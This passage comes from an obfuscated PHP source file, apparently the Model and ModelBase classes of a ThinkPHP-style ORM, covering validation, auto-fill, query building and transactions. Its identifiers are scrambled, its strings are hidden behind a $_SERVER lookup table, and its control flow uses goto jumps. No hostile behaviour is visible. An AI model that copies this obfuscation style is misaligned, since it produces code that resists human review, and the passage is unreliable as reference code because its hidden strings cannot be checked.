THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$C÷ß¿ˆÜ¿¿[261]])) { $FÑÕ‚„š = $this->options[$C÷ß¿ˆÜ¿¿[261]]; unset($this->options[$C÷ß¿ˆÜ¿¿[261]]); } elseif ($bÂ®³Ó‰¬ == THINK_MODEL_INSERT && isset($this->insertFields)) { $FÑÕ‚„š = $this->insertFields; } elseif ($bÂ®³Ó‰¬ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $FÑÕ‚„š = $this->updateFields; } goto FÉ‡è‚ Ÿ‚; B«×®Ê“© : } public function autoCheckToken($b“âŒÃŠ) { $aùæÍ˜ÆÎ‘ =& $_SERVER[¯Ò¬Èè]; if (isset($this->options[$aùæÍ˜ÆÎ‘[289]]) && !$this->options[$aùæÍ˜ÆÎ‘[289]]) { return !0; } if (think_config($aùæÍ˜ÆÎ‘[286])) { $f¯ĞÏºãïô = think_config($aùæÍ˜ÆÎ‘[287]); if (!isset($b“âŒÃŠ[$f¯ĞÏºãïô]) || Session::get($f¯ĞÏºãïô)) { return !1; } list($B›§‚õ¨ŒÈ, $d×”îÆ½ÄÎ) = explode($aùæÍ˜ÆÎ‘[70], $b“âŒÃŠ[$f¯ĞÏºãïô]); if ($d×”îÆ½ÄÎ && Session::get($f¯ĞÏºãïô . $aùæÍ˜ÆÎ‘[91] . $B›§‚õ¨ŒÈ) === $d×”îÆ½ÄÎ) { Session::remove($f¯ĞÏºãïô . $aùæÍ˜ÆÎ‘[91] . $B›§‚õ¨ŒÈ); return !0; } if (think_config($aùæÍ˜ÆÎ‘[290])) { Session::remove($f¯ĞÏºãïô . $aùæÍ˜ÆÎ‘[91] . $B›§‚õ¨ŒÈ); } return !1; } return !0; } public function regex($bóêâ‡²Ì, $b‹â£Ä¸¹Ë) { $AÂ™¡‡ƒÃ¦ =& $_SERVER[¯Ò¬Èè]; $CÅµ “×Åô = array($AÂ™¡‡ƒÃ¦[291] => $AÂ™¡‡ƒÃ¦[292], $AÂ™¡‡ƒÃ¦[293] => $AÂ™¡‡ƒÃ¦[294], $AÂ™¡‡ƒÃ¦[295] => $AÂ™¡‡ƒÃ¦[296], $AÂ™¡‡ƒÃ¦[297] => $AÂ™¡‡ƒÃ¦[298], $AÂ™¡‡ƒÃ¦[299] => $AÂ™¡‡ƒÃ¦[300], $AÂ™¡‡ƒÃ¦[301] => $AÂ™¡‡ƒÃ¦[302], $AÂ™¡‡ƒÃ¦[303] => $AÂ™¡‡ƒÃ¦[304], $AÂ™¡‡ƒÃ¦[278] => $AÂ™¡‡ƒÃ¦[305], $AÂ™¡‡ƒÃ¦[306] => $AÂ™¡‡ƒÃ¦[307]); if (isset($CÅµ “×Åô[strtolower($b‹â£Ä¸¹Ë)])) { $b‹â£Ä¸¹Ë = $CÅµ “×Åô[strtolower($b‹â£Ä¸¹Ë)]; } return preg_match($b‹â£Ä¸¹Ë, $bóêâ‡²Ì) === 1; } private function autoOperation(&$Fƒ†‹ÎÂç›, $B¥æÆç“ë£) { $FÔ‰“–Æ¹Ç =& $_SERVER[¯Ò¬Èè]; if (!empty($this->options[$FÔ‰“–Æ¹Ç[308]])) { $B™’çâ­õ† = $this->options[$FÔ‰“–Æ¹Ç[308]]; unset($this->options[$FÔ‰“–Æ¹Ç[308]]); } elseif (!empty($this->_auto)) { $B™’çâ­õ† = $this->_auto; } if (isset($B™’çâ­õ†)) { foreach ($B™’çâ­õ† as $cÃëŠÇ¼çÕ) { if (empty($cÃëŠÇ¼çÕ[2])) { $cÃëŠÇ¼çÕ[2] = THINK_MODEL_INSERT; } if ($B¥æÆç“ë£ == $cÃëŠÇ¼çÕ[2] || $cÃëŠÇ¼çÕ[2] == THINK_MODEL_BOTH) { switch (trim($cÃëŠÇ¼çÕ[3])) { case $FÔ‰“–Æ¹Ç[309]: case $FÔ‰“–Æ¹Ç[310]: $Bñ„Û¯ğ¤ = isset($cÃëŠÇ¼çÕ[4]) ? (array) $cÃëŠÇ¼çÕ[4] : array(); if (isset($Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]])) { array_unshift($Bñ„Û¯ğ¤, $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]]); } if ($FÔ‰“–Æ¹Ç[309] == $cÃëŠÇ¼çÕ[3]) { $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]] = call_user_func_array($cÃëŠÇ¼çÕ[1], $Bñ„Û¯ğ¤); } else { $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]] = call_user_func_array(array(&$this, $cÃëŠÇ¼çÕ[1]), $Bñ„Û¯ğ¤); } break; case $FÔ‰“–Æ¹Ç[261]: $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]] = $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[1]]; break; case $FÔ‰“–Æ¹Ç[311]: if ($FÔ‰“–Æ¹Ç[33] === $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]]) { unset($Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]]); } break; case $FÔ‰“–Æ¹Ç[312]: default: $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]] = $cÃëŠÇ¼çÕ[1]; } if (!1 === $Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]]) { unset($Fƒ†‹ÎÂç›[$cÃëŠÇ¼çÕ[0]]); } } } } return $Fƒ†‹ÎÂç›; } protected function autoValidation($b¡¡Œ‘¬ó°, $C—¬Æéè”ï) { $CèÌ¥ÙÓè£ =& $_SERVER[¯Ò¬Èè]; if (!empty($this->options[$CèÌ¥ÙÓè£[313]])) { $eÔ¯§©‰¤“ = $this->options[$CèÌ¥ÙÓè£[313]]; unset($this->options[$CèÌ¥ÙÓè£[313]]); } elseif (!empty($this->_validate)) { $eÔ¯§©‰¤“ = $this->_validate; } if (isset($eÔ¯§©‰¤“)) { if ($this->patchValidate) { $this->error = array(); } foreach ($eÔ¯§©‰¤“ as $dÜ—æÇÈá° => $E‚²Á‚Öëå) { if (empty($E‚²Á‚Öëå[5]) || $E‚²Á‚Öëå[5] == THINK_MODEL_BOTH || $E‚²Á‚Öëå[5] == $C—¬Æéè”ï) { if (0 == strpos($E‚²Á‚Öëå[2], $CèÌ¥ÙÓè£[314]) && strpos($E‚²Á‚Öëå[2], $CèÌ¥ÙÓè£[315])) { $E‚²Á‚Öëå[2] = think_lang(substr($E‚²Á‚Öëå[2], 2, -1)); } $E‚²Á‚Öëå[3] = isset($E‚²Á‚Öëå[3]) ? $E‚²Á‚Öëå[3] : THINK_EXISTS_VALIDATE; $E‚²Á‚Öëå[4] = isset($E‚²Á‚Öëå[4]) ? $E‚²Á‚Öëå[4] : $CèÌ¥ÙÓè£[316]; switch ($E‚²Á‚Öëå[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($b¡¡Œ‘¬ó°, $E‚²Á‚Öëå)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CèÌ¥ÙÓè£[33] != trim($b¡¡Œ‘¬ó°[$E‚²Á‚Öëå[0]])) { if (!1 === $this->_validationField($b¡¡Œ‘¬ó°, $E‚²Á‚Öëå)) { return !1; } } break; default: if (isset($b¡¡Œ‘¬ó°[$E‚²Á‚Öëå[0]])) { if (!1 === $this->_validationField($b¡¡Œ‘¬ó°, $E‚²Á‚Öëå)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($F˜Ì…Ø¿Û, $CáïöÜ…ê) { if (!1 === $this->_validationFieldItem($F˜Ì…Ø¿Û, $CáïöÜ…ê)) { if ($this->patchValidate) { $this->error[$CáïöÜ…ê[0]] = $CáïöÜ…ê[2]; } else { $this->error = $CáïöÜ…ê[2]; return !1; } } return; } protected function _validationFieldItem($CêŸ©œï©£, $C¥’¨¾ÈÍ) { $f‚ÛóêÄŠ× =& $_SERVER[¯Ò¬Èè]; switch (strtolower(trim($C¥’¨¾ÈÍ[4]))) { case $f‚ÛóêÄŠ×[309]: case $f‚ÛóêÄŠ×[310]: $aÔ‰ù¹óÛÌ = isset($C¥’¨¾ÈÍ[6]) ? (array) $C¥’¨¾ÈÍ[6] : array(); if (is_string($C¥’¨¾ÈÍ[0]) && strpos($C¥’¨¾ÈÍ[0], $f‚ÛóêÄŠ×[47])) { $C¥’¨¾ÈÍ[0] = explode($f‚ÛóêÄŠ×[47], $C¥’¨¾ÈÍ[0]); } if (is_array($C¥’¨¾ÈÍ[0])) { foreach ($C¥’¨¾ÈÍ[0] as $b¦‡«¢İµÂ) { $c²Ã¹ï‰‰Ó[$b¦‡«¢İµÂ] = $CêŸ©œï©£[$b¦‡«¢İµÂ]; } array_unshift($aÔ‰ù¹óÛÌ, $c²Ã¹ï‰‰Ó); } else { array_unshift($aÔ‰ù¹óÛÌ, $CêŸ©œï©£[$C¥’¨¾ÈÍ[0]]); } if ($f‚ÛóêÄŠ×[309] == $C¥’¨¾ÈÍ[4]) { return call_user_func_array($C¥’¨¾ÈÍ[1], $aÔ‰ù¹óÛÌ); } else { return call_user_func_array(array(&$this, $C¥’¨¾ÈÍ[1]), $aÔ‰ù¹óÛÌ); } case $f‚ÛóêÄŠ×[317]: return $CêŸ©œï©£[$C¥’¨¾ÈÍ[0]] == $CêŸ©œï©£[$C¥’¨¾ÈÍ[1]]; case $f‚ÛóêÄŠ×[318]: if (is_string($C¥’¨¾ÈÍ[0]) && strpos($C¥’¨¾ÈÍ[0], $f‚ÛóêÄŠ×[47])) { $C¥’¨¾ÈÍ[0] = explode($f‚ÛóêÄŠ×[47], $C¥’¨¾ÈÍ[0]); } $B÷”Íã©êÔ = array(); if (is_array($C¥’¨¾ÈÍ[0])) { foreach ($C¥’¨¾ÈÍ[0] as $b¦‡«¢İµÂ) { $B÷”Íã©êÔ[$b¦‡«¢İµÂ] = $CêŸ©œï©£[$b¦‡«¢İµÂ]; } } else { $B÷”Íã©êÔ[$C¥’¨¾ÈÍ[0]] = $CêŸ©œï©£[$C¥’¨¾ÈÍ[0]]; } if (!empty($CêŸ©œï©£[$this->getPk()])) { $B÷”Íã©êÔ[$this->getPk()] = array($f‚ÛóêÄŠ×[319], $CêŸ©œï©£[$this->getPk()]); } if ($this->where($B÷”Íã©êÔ)->find()) { return !1; } return !0; default: return $this->check($CêŸ©œï©£[$C¥’¨¾ÈÍ[0]], $C¥’¨¾ÈÍ[1], $C¥’¨¾ÈÍ[4]); } } public function check($e‹îğ›°‡, $eœƒŒ±Ğ˜, $BŞñ³ÀÅ¢µ = "\x72\x65\147\x65\170") { $cêò¯ÏÙÌô =& $_SERVER[¯Ò¬Èè]; $BŞñ³ÀÅ¢µ = strtolower(trim($BŞñ³ÀÅ¢µ)); switch ($BŞñ³ÀÅ¢µ) { case $cêò¯ÏÙÌô[7]: case $cêò¯ÏÙÌô[320]: $A¯¥Ÿëáä = is_array($eœƒŒ±Ğ˜) ? $eœƒŒ±Ğ˜ : explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜); return $BŞñ³ÀÅ¢µ == $cêò¯ÏÙÌô[7] ? in_array($e‹îğ›°‡, $A¯¥Ÿëáä) : !in_array($e‹îğ›°‡, $A¯¥Ÿëáä); case $cêò¯ÏÙÌô[321]: case $cêò¯ÏÙÌô[322]: if (is_array($eœƒŒ±Ğ˜)) { $eàŞÏ“‰—Ò = $eœƒŒ±Ğ˜[0]; $eŸÇ™Ò½»œ = $eœƒŒ±Ğ˜[1]; } else { list($eàŞÏ“‰—Ò, $eŸÇ™Ò½»œ) = explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜); } return $BŞñ³ÀÅ¢µ == $cêò¯ÏÙÌô[321] ? $e‹îğ›°‡ >= $eàŞÏ“‰—Ò && $e‹îğ›°‡ <= $eŸÇ™Ò½»œ : $e‹îğ›°‡ < $eàŞÏ“‰—Ò || $e‹îğ›°‡ > $eŸÇ™Ò½»œ; case $cêò¯ÏÙÌô[323]: case $cêò¯ÏÙÌô[324]: return $BŞñ³ÀÅ¢µ == $cêò¯ÏÙÌô[323] ? $e‹îğ›°‡ == $eœƒŒ±Ğ˜ : $e‹îğ›°‡ != $eœƒŒ±Ğ˜; case $cêò¯ÏÙÌô[325]: $Aéê‚İ¤Œ¿ = mb_strlen($e‹îğ›°‡, $cêò¯ÏÙÌô[326]); if (strpos($eœƒŒ±Ğ˜, $cêò¯ÏÙÌô[47])) { list($eàŞÏ“‰—Ò, $eŸÇ™Ò½»œ) = explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜); return $Aéê‚İ¤Œ¿ >= $eàŞÏ“‰—Ò && $Aéê‚İ¤Œ¿ <= $eŸÇ™Ò½»œ; } else { return $Aéê‚İ¤Œ¿ == $eœƒŒ±Ğ˜; } case $cêò¯ÏÙÌô[327]: list($dêÔ ïÖĞğ, $B™åêó Ì£) = explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜); if (!is_numeric($dêÔ ïÖĞğ)) { $dêÔ ïÖĞğ = strtotime($dêÔ ïÖĞğ); } if (!is_numeric($B™åêó Ì£)) { $B™åêó Ì£ = strtotime($B™åêó Ì£); } return NOW_TIME >= $dêÔ ïÖĞğ && NOW_TIME <= $B™åêó Ì£; case $cêò¯ÏÙÌô[328]: return in_array(get_client_ip(), explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜)); case $cêò¯ÏÙÌô[329]: return !in_array(get_client_ip(), explode($cêò¯ÏÙÌô[47], $eœƒŒ±Ğ˜)); case $cêò¯ÏÙÌô[316]: default: return $this->regex($e‹îğ›°‡, $eœƒŒ±Ğ˜); } } public function query($c¾ì¹¬ñ«®, $Fæø®†Şé = false) { $C²ƒ¿ÑŠ–Ì =& $_SERVER[¯Ò¬Èè]; if (!is_bool($Fæø®†Şé) && !is_array($Fæø®†Şé)) { $Fæø®†Şé = func_get_args(); array_shift($Fæø®†Şé); } $c¾ì¹¬ñ«® = str_replace(array($C²ƒ¿ÑŠ–Ì[217], $C²ƒ¿ÑŠ–Ì[330]), $C²ƒ¿ÑŠ–Ì[50], $c¾ì¹¬ñ«®); $c¾ì¹¬ñ«® = $this->parseSql($c¾ì¹¬ñ«®, $Fæø®†Şé); return $this->db->query($c¾ì¹¬ñ«®); } public function execute($B¬™»ÒÉÜ, $BïÏ¿‰‰‚Ñ = false) { if (!is_bool($BïÏ¿‰‰‚Ñ) && !is_array($BïÏ¿‰‰‚Ñ)) { $BïÏ¿‰‰‚Ñ = func_get_args(); array_shift($BïÏ¿‰‰‚Ñ); } $B¬™»ÒÉÜ = $this->parseSql($B¬™»ÒÉÜ, $BïÏ¿‰‰‚Ñ); return $this->db->execute($B¬™»ÒÉÜ); } protected function parseSql($eğŒŠÍÒÖâ, $c–é­Ïƒìé) { $Fñë×Š½ÊŒ =& $_SERVER[¯Ò¬Èè]; if (!0 === $c–é­Ïƒìé) { $cïÊæ†ŒÊ³ = $this->_parseOptions(); $eğŒŠÍÒÖâ = $this->db->parseSql($eğŒŠÍÒÖâ, $cïÊæ†ŒÊ³); } elseif (is_array($c–é­Ïƒìé)) { $c–é­Ïƒìé = array_map(array($this->db, $Fñë×Š½ÊŒ[331]), $c–é­Ïƒìé); $eğŒŠÍÒÖâ = vsprintf($eğŒŠÍÒÖâ, $c–é­Ïƒìé); } else { $eğŒŠÍÒÖâ = strtr($eğŒŠÍÒÖâ, array($Fñë×Š½ÊŒ[332] => $this->getTableName(), $Fñë×Š½ÊŒ[333] => think_config($Fñë×Š½ÊŒ[232]))); } $this->db->setModel($this->name); return $eğŒŠÍÒÖâ; } public function db($cğ½…¨İ± = '', $Eâìæõœˆ = '', $f“Ößô¶õÊ = array()) { goto aÄÕİ­éãä; fæ¾êÉõã¥: $eô¥¦Š¬À‰[$cğ½…¨İ±] = $Eâìæõœˆ; $this->db = $c‡¤ÅçÙî[$cğ½…¨İ±]; $this->_after_db(); goto B‡ÎÚÆÍô; fãÌ˜Õ“Â¿: static $c‡¤ÅçÙî = array(); if (!isset($c‡¤ÅçÙî[$cğ½…¨İ±]) || isset($c‡¤ÅçÙî[$cğ½…¨İ±]) && $Eâìæõœˆ && $eô¥¦Š¬À‰[$cğ½…¨İ±] != $Eâìæõœˆ) { if (!empty($Eâìæõœˆ) && is_string($Eâìæõœˆ) && !1 === strpos($Eâìæõœˆ, $dí—©åÚÕ[8])) { $Eâìæõœˆ = think_config($Eâìæõœˆ); } $c‡¤ÅçÙî[$cğ½…¨İ±] = Db::getInstance($Eâìæõœˆ); } elseif (NULL === $Eâìæõœˆ) { $c‡¤ÅçÙî[$cğ½…¨İ±]->close(); unset($c‡¤ÅçÙî[$cğ½…¨İ±]); return; } if (!empty($f“Ößô¶õÊ)) { if (is_string($f“Ößô¶õÊ)) { parse_str($f“Ößô¶õÊ, $f“Ößô¶õÊ); } foreach ($f“Ößô¶õÊ as $A¥ø¼Ü³Äù => $bÛÁÕÓØŞ²) { $this->setProperty($A¥ø¼Ü³Äù, $bÛÁÕÓØŞ²); } } goto fæ¾êÉõã¥; aÄÕİ­éãä: $dí—©åÚÕ =& $_SERVER[¯Ò¬Èè]; if ($dí—©åÚÕ[33] === $cğ½…¨İ± && $this->db) { return $this->db; } static $eô¥¦Š¬À‰ = array(); goto fãÌ˜Õ“Â¿; B‡ÎÚÆÍô: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto c–¶‰åÚÚó; c–¶‰åÚÚó: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $e¦Ç®Û½´ƒ = get_class($this); if ($e¦Ç®Û½´ƒ == $_SERVER[¯Ò¬Èè][334]) { return $this->name; } $this->name = substr($e¦Ç®Û½´ƒ, 0, -5); } return $this->name; } public function getTableName() { $B¿©éëèÙµ =& $_SERVER[¯Ò¬Èè]; if (empty($this->trueTableName)) { $b®½™ÑŒ£¬ = !empty($this->tablePrefix) ? $this->tablePrefix : $B¿©éëèÙµ[33]; if (!empty($this->tableName)) { $b®½™ÑŒ£¬ .= $this->tableName; } else { $b®½™ÑŒ£¬ .= think_parse_name($this->name); } $this->trueTableName = strtolower($b®½™ÑŒ£¬); } return (!empty($this->dbName) ? $this->dbName . $B¿©éëèÙµ[91] : $B¿©éëèÙµ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $e¤¨ó°àâ =& $_SERVER[¯Ò¬Èè]; return isset($this->fields[$e¤¨ó°àâ[239]]) ? $this->fields[$e¤¨ó°àâ[239]] : $this->pk; } public function getDbFields() { $fæ“ÈÏ›— =& $_SERVER[¯Ò¬Èè]; if (isset($this->options[$fæ“ÈÏ›—[267]])) { $eæ¸áÇ²§ç = $this->db->getFields($this->options[$fæ“ÈÏ›—[267]]); return $eæ¸áÇ²§ç ? array_keys($eæ¸áÇ²§ç) : !1; } if ($this->fields) { $eæ¸áÇ²§ç = $this->fields; unset($eæ¸áÇ²§ç[$fæ“ÈÏ›—[238]], $eæ¸áÇ²§ç[$fæ“ÈÏ›—[239]], $eæ¸áÇ²§ç[$fæ“ÈÏ›—[240]], $eæ¸áÇ²§ç[$fæ“ÈÏ›—[237]]); return $eæ¸áÇ²§ç; } return !1; } public function data($bã£ †¬¤± = '') { $bÛ„ÚËÀ¬Ä =& $_SERVER[¯Ò¬Èè]; if ($bÛ„ÚËÀ¬Ä[33] === $bã£ †¬¤± && !empty($this->data)) { return $this->data; } if (is_object($bã£ †¬¤±)) { $bã£ †¬¤± = get_object_vars($bã£ †¬¤±); } elseif (is_string($bã£ †¬¤±)) { parse_str($bã£ †¬¤±, $bã£ †¬¤±); } elseif (!is_array($bã£ †¬¤±)) { think_exception(think_lang($bÛ„ÚËÀ¬Ä[259])); } $this->data = $bã£ †¬¤±; return $this; } public function join($DÎ”ÏÓ·çÏ) { $E¥±İ‚Ù® =& $_SERVER[¯Ò¬Èè]; if (is_array($DÎ”ÏÓ·çÏ)) { $this->options[$E¥±İ‚Ù®[270]] = $DÎ”ÏÓ·çÏ; } elseif (!empty($DÎ”ÏÓ·çÏ)) { $this->options[$E¥±İ‚Ù®[270]][] = $DÎ”ÏÓ·çÏ; } return $this; } public function union($f‘Ì…ù–, $fÓ…Çİ•µ = false) { goto D‹ó˜»ùô¸; B‹±³Õï’: if (is_object($f‘Ì…ù–)) { $f‘Ì…ù– = get_object_vars($f‘Ì…ù–); } if (is_string($f‘Ì…ù–)) { $bğ‘‚¾ğÁå = $f‘Ì…ù–; } elseif (is_array($f‘Ì…ù–)) { if (isset($f‘Ì…ù–[0])) { $this->options[$DÂ§êÚŒ˜£[335]] = array_merge($this->options[$DÂ§êÚŒ˜£[335]], $f‘Ì…ù–); return $this; } else { $bğ‘‚¾ğÁå = $f‘Ì…ù–; } } else { think_exception(think_lang($DÂ§êÚŒ˜£[259])); } $this->options[$DÂ§êÚŒ˜£[335]][] = $bğ‘‚¾ğÁå; goto C½’‚˜—÷; D‹ó˜»ùô¸: $DÂ§êÚŒ˜£ =& $_SERVER[¯Ò¬Èè]; if (empty($f‘Ì…ù–)) { return $this; } if ($fÓ…Çİ•µ) { $this->options[$DÂ§êÚŒ˜£[335]][$DÂ§êÚŒ˜£[336]] = !0; } goto B‹±³Õï’; C½’‚˜—÷: return $this; goto a—Å÷™Ä¬Ù; a—Å÷™Ä¬Ù: } public function cache($Fîí¾ŠË´ø = true, $dåœ¸ê† = null, $bğçƒ¾Èˆ· = '') { $F‰´’íê =& $_SERVER[¯Ò¬Èè]; if (!1 !== $Fîí¾ŠË´ø) { $this->options[$F‰´’íê[337]] = array($F‰´’íê[89] => $Fîí¾ŠË´ø, $F‰´’íê[327] => $dåœ¸ê†, $F‰´’íê[29] => $bğçƒ¾Èˆ·); } return $this; } public function field($EàÂÒ¢Çº˜, $Fœ·¡÷å¤İ = false) { $cóÒš¼‚Ä =& $_SERVER[¯Ò¬Èè]; if (!0 === $EàÂÒ¢Çº˜) { $e‡¤Äºƒ = $this->getDbFields(); $EàÂÒ¢Çº˜ = $e‡¤Äºƒ ? $e‡¤Äºƒ : $cóÒš¼‚Ä[176]; } elseif ($Fœ·¡÷å¤İ) { if (is_string($EàÂÒ¢Çº˜)) { $EàÂÒ¢Çº˜ = explode($cóÒš¼‚Ä[47], $EàÂÒ¢Çº˜); } $e‡¤Äºƒ = $this->getDbFields(); $EàÂÒ¢Çº˜ = $e‡¤Äºƒ ? array_diff($e‡¤Äºƒ, $EàÂÒ¢Çº˜) : $EàÂÒ¢Çº˜; } $this->options[$cóÒš¼‚Ä[261]] = $EàÂÒ¢Çº˜; return $this; } public function scope($fÔĞºøí¾ = '', $A™Å×·ïï = NULL) { $bŒ™¥É¿Ê =& $_SERVER[¯Ò¬Èè]; if ($bŒ™¥É¿Ê[33] === $fÔĞºøí¾) { if (isset($this->_scope[$bŒ™¥É¿Ê[34]])) { $A¾…÷Íí‰ = $this->_scope[$bŒ™¥É¿Ê[34]]; } else { return $this; } } elseif (is_string($fÔĞºøí¾)) { $e¬óŸ¸‘©¤ = explode($bŒ™¥É¿Ê[47], $fÔĞºøí¾); $A¾…÷Íí‰ = array(); foreach ($e¬óŸ¸‘©¤ as $FÓÍ¯Ø·°Ã) { if (!isset($this->_scope[$FÓÍ¯Ø·°Ã])) { continue; } $A¾…÷Íí‰ = array_merge($A¾…÷Íí‰, $this->_scope[$FÓÍ¯Ø·°Ã]); } if (!empty($A™Å×·ïï) && is_array($A™Å×·ïï)) { $A¾…÷Íí‰ = array_merge($A¾…÷Íí‰, $A™Å×·ïï); } } elseif (is_array($fÔĞºøí¾)) { $A¾…÷Íí‰ = $fÔĞºøí¾; } if (is_array($A¾…÷Íí‰) && !empty($A¾…÷Íí‰)) { $this->options = array_merge($this->options, array_change_key_case($A¾…÷Íí‰)); } return $this; } public function where($E×²Öùƒß, $C¸„±¼°éÌ = null) { $c—‡‚ùŒîƒ =& $_SERVER[¯Ò¬Èè]; if (!is_null($C¸„±¼°éÌ) && is_string($E×²Öùƒß)) { if (!is_array($C¸„±¼°éÌ)) { $C¸„±¼°éÌ = func_get_args(); array_shift($C¸„±¼°éÌ); } $C¸„±¼°éÌ = array_map(array($this->db, $c—‡‚ùŒîƒ[331]), $C¸„±¼°éÌ); $E×²Öùƒß = vsprintf($E×²Öùƒß, $C¸„±¼°éÌ); } elseif (is_object($E×²Öùƒß)) { $E×²Öùƒß = get_object_vars($E×²Öùƒß); } elseif (is_array($E×²Öùƒß)) { foreach ($E×²Öùƒß as $B½»ÍÔ‘é => $B¸ƒõª¥˜Ï) { if ((is_numeric($B½»ÍÔ‘é) || !$B½»ÍÔ‘é) && is_string($B¸ƒõª¥˜Ï)) { think_trace($c—‡‚ùŒîƒ[338], $c—‡‚ùŒîƒ[33], $c—‡‚ùŒîƒ[46]); die; } } } if (is_string($E×²Öùƒß) && $c—‡‚ùŒîƒ[33] != $E×²Öùƒß) { $böª¼›ŒŒ = array(); $böª¼›ŒŒ[$c—‡‚ùŒîƒ[339]] = $E×²Öùƒß; $E×²Öùƒß = $böª¼›ŒŒ; } if (isset($this->options[$c—‡‚ùŒîƒ[263]])) { $this->options[$c—‡‚ùŒîƒ[263]] = array_merge($this->options[$c—‡‚ùŒîƒ[263]], $E×²Öùƒß); } else { $this->options[$c—‡‚ùŒîƒ[263]] = $E×²Öùƒß; } return $this; } public function limit($C›×Ş´‡œè, $Dñ´Õˆ¨¢é = null) { $C—î×­·‡ä =& $_SERVER[¯Ò¬Èè]; $this->options[$C—î×­·‡ä[280]] = is_null($Dñ´Õˆ¨¢é) ? $C›×Ş´‡œè : $C›×Ş´‡œè . $C—î×­·‡ä[47] . $Dñ´Õˆ¨¢é; return $this; } public function page($dóÄ¯¿¹çç, $e°í‹Şå¬ = null) { $CÅÌèø‘ìœ =& $_SERVER[¯Ò¬Èè]; $this->options[$CÅÌèø‘ìœ[340]] = is_null($e°í‹Şå¬) ? $dóÄ¯¿¹çç : $dóÄ¯¿¹çç . $CÅÌèø‘ìœ[47] . $e°í‹Şå¬; return $this; } public function comment($Eåœ­÷ù£) { $this->options[$_SERVER[¯Ò¬Èè][341]] = $Eåœ­÷ù£; return $this; } public function setProperty($Cò…‡Ö´¿, $còÂ‚³Æä) { if (property_exists($this, $Cò…‡Ö´¿)) { $this->{$Cò…‡Ö´¿} = $còÂ‚³Æä; } return $this; } } goto C‰¦íñÅ–å; eãŒÜ ˆíÉ: define($_SERVER[¯Ò¬Èè][1943], 3); define($_SERVER[¯Ò¬Èè][1944], 4); define($_SERVER[¯Ò¬Èè][1945], 5); goto eîÄìŞ¿’”; F–²ğÅƒ¾Ù: define($_SERVER[¯Ò¬Èè][227], 2); define($_SERVER[¯Ò¬Èè][228], 3); define($_SERVER[¯Ò¬Èè][229], 1); goto a‰óÏå´ÔŸ; C‰¦íñÅ–å: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\x69\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\x72\164\54\165\x70\x64\141\164\x65", "\x66\x75\156\x63\164\151\157\x6e"), array("\x63\162\145\x61\x74\145\x54\x69\x6d\145", "\164\151\155\145", "\x69\156\163\x65\162\x74", "\146\x75\x6e\143\x74\151\x6f\156")); public function setDataAuto($f¢å’êø) { $this->dataAuto = $f¢å’êø; } public function __construct($c¸ ˆÀŠèÌ = '', $dÒ‡œ«·‚ê = '', $c¦Æ°ó£‘À = '') { parent::__construct($c¸ ˆÀŠèÌ, $dÒ‡œ«·‚ê, $c¦Æ°ó£‘À); } public static function textEncode($d¹“´»ëù¥) { if (!$d¹“´»ëù¥) { return $d¹“´»ëù¥; } $Aƒ‘öëŠª = json_encode($d¹“´»ëù¥); $Aƒ‘öëŠª = preg_replace_callback($_SERVER[¯Ò¬Èè][342], function ($d‹‚Ÿµ¸™²) { return addslashes($d‹‚Ÿµ¸™²[0]); }, $Aƒ‘öëŠª); return json_decode($Aƒ‘öëŠª); } public static function textDecode($cŒè† –Ö¶) { $d‹¶Ş‹¼“ =& $_SERVER[¯Ò¬Èè]; $AÈÌÁ¡È’ = json_encode($cŒè† –Ö¶); $AÈÌÁ¡È’ = preg_replace_callback($d‹¶Ş‹¼“[343], function ($FãÜÁŸê¾·) { return $_SERVER[¯Ò¬Èè][93]; }, $AÈÌÁ¡È’); return json_decode($AÈÌÁ¡È’); } protected $tableMeta = array(); protected function _beforeInsert(&$a¬«Ìêöà, $a¶ÚëŞ™Êª) { $C¸¼Àâ¾•¼ =& $_SERVER[¯Ò¬Èè]; if (!$this->checkDataAutoHas($C¸¼Àâ¾•¼[344])) { return; } $this->dataBeforeFilter($a¬«Ìêöà, $C¸¼Àâ¾•¼[344]); } protected function _beforeUpdate(&$eôÊ´É˜ˆà, $e†¨¿Ì¯…) { $bŒëù‰ƒ¸ =& $_SERVER[¯Ò¬Èè]; if (!$this->checkDataAutoHas($bŒëù‰ƒ¸[345])) { return; } $this->dataBeforeFilter($eôÊ´É˜ˆà, $bŒëù‰ƒ¸[345]); } protected function _afterSelect(&$d‚Â·½‰È, $BŠ™Êƒ‡×) { if (!is_array($d‚Â·½‰È)) { return; } if (!$this->checkDataAutoHas($_SERVER[¯Ò¬Èè][346])) { return; } foreach ($d‚Â·½‰È as &$CµÚÔÈ”Íæ) { $this->dataAfterFilter($CµÚÔÈ”Íæ); } } protected function _afterFind(&$F†Ñ©‡Ûì, 